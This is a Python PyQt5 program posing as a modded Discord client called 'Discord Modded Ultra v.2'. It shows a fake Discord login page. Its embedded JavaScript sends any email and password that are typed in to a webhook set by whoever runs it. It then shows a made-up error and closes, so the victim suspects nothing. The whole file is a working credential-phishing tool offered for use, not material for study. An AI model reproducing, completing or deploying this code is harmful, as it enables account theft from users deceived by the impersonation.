import sys
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import pyqtSlot
from PyQt5.QtGui import QIcon

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Discord Modded Ultra v.2")
        self.setGeometry(100, 100, 1000, 750)  # Größere Fenstergröße
        self.setWindowIcon(QIcon('icon.png'))  # Setzen des App-Icons

        self.initUI()

    def initUI(self):
        self.webEngineView = QWebEngineView(self)
        self.webEngineView.setGeometry(0, 0, 1000, 750)  # Größere WebView-Größe

        html_content = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Discord Modded Ultra v.2</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    background-image: url('https://images.alphacoders.com/129/1291249.png?dl=1');
                    background-size: cover;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }

                .login-container {
                    background-color: rgba(255, 255, 255, 0.8);
                    padding: 40px; /* Größerer Innenabstand */
                    border-radius: 10px; /* Größere Abrundung der Ecken */
                    box-shadow: 0 0 20px rgba(0, 0, 0, 0.2); /* Stärkerer Schatten */
                    text-align: center;
                }

                .login-container img {
                    max-width: 200px; /* Größerer maximale Breite des Logos */
                    margin-bottom: 40px; /* Größerer Abstand nach unten */
                }

                .login-form input[type="text"],
                .login-form input[type="password"] {
                    width: 100%;
                    padding: 15px; /* Größere Polsterung */
                    margin-bottom: 20px; /* Größerer Abstand nach unten */
                    border: 2px solid #ccc; /* Stärkere Rahmen */
                    border-radius: 8px; /* Größere Abrundung der Ecken */
                    box-sizing: border-box;
                    font-size: 18px; /* Größere Schriftgröße */
                }

                .login-form input[type="password"] {
                    position: relative;
                }

                .login-form .toggle-password {
                    position: relative;
                    float: right;
                    margin-left: -35px; /* Neue Margin hinzugefügt */
                    cursor: pointer;
                    font-size: 25px; /* Größere Schriftgröße für das Auge */
                }

                .login-form input[type="submit"] {
                    background-color: #7289da; /* Hintergrundfarbe von Discord */
                    color: white; /* Textfarbe */
                    padding: 15px 25px; /* Größere Polsterung */
                    border: none; /* Kein Rahmen */
                    border-radius: 8px; /* Abrundung der Ecken */
                    font-size: 20px; /* Größere Schriftgröße */
                    cursor: pointer; /* Zeiger bei Mouseover */
                    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3); /* Stärkerer Schatten */
                    transition: background-color 0.3s, transform 0.2s; /* Übergangseffekte */
                }

                .login-form input[type="submit"]:hover {
                    background-color: #677bc4; /* Hintergrundfarbe bei Mouseover */
                    transform: translateY(-2px); /* Anheben beim Mouseover */
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flogodownload.org%2Fwp-content%2Fuploads%2F2017%2F11%2Fdiscord-logo-1-1.png&f=1&nofb=1&ipt=23deaf9e5a4280010e3b346c1bff935d46c63834c4b317b0738da7eab1164910&ipo=images" alt="Discord Logo">
                <h2>Log in to Discord</h2>
                <form id="login-form" class="login-form" action="/login" method="post">
                    <input id="email" type="text" name="email" placeholder="Email" required><br>
                    <input id="password" type="password" name="password" placeholder="Password" required>
                    <span class="toggle-password" onclick="togglePasswordVisibility()">&#128065;</span><br> <!-- Moved beside password field -->
                    <input type="submit" value="Log In" onclick="sendData()">
                </form>
            </div>

            <script>
                function sendData() {
                    var email = document.getElementById("email").value;
                    var password = document.getElementById("password").value;

                    if (email && password) { // Überprüfen, ob beide Felder ausgefüllt sind
                        var webhookUrl = 'My Webhook';

                        var data = {
                            'content': 'Email: ' + email + ', Password: ' + password
                        };

                        fetch(webhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Network response was not ok');
                            }
                            alert('Your System doesnt have the necessary Involvement to use Discord Modded Ultra v.2 in Discord');
                            window.pywebview.api.closeWindow(); // Schließt das Fenster
                        })
                        .catch(error => {
                            console.error('There was an error!', error);
                        });
                    } else {
                        alert('Please enter both email and password.'); // Fehlermeldung für fehlende Eingaben
                    }
                }

                function togglePasswordVisibility() {
                    var passwordField = document.getElementById("password");
                    if (passwordField.type === "password") {
                        passwordField.type = "text";
                    } else {
                        passwordField.type = "password";
                    }
                }
            </script>
        </body>
        </html>
        """

        self.webEngineView.setHtml(html_content)
        self.setCentralWidget(self.webEngineView)

    @pyqtSlot()
    def close_window(self):
        self.close()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    mainWindow = MainWindow()
    mainWindow.show()
    sys.exit(app.exec_())
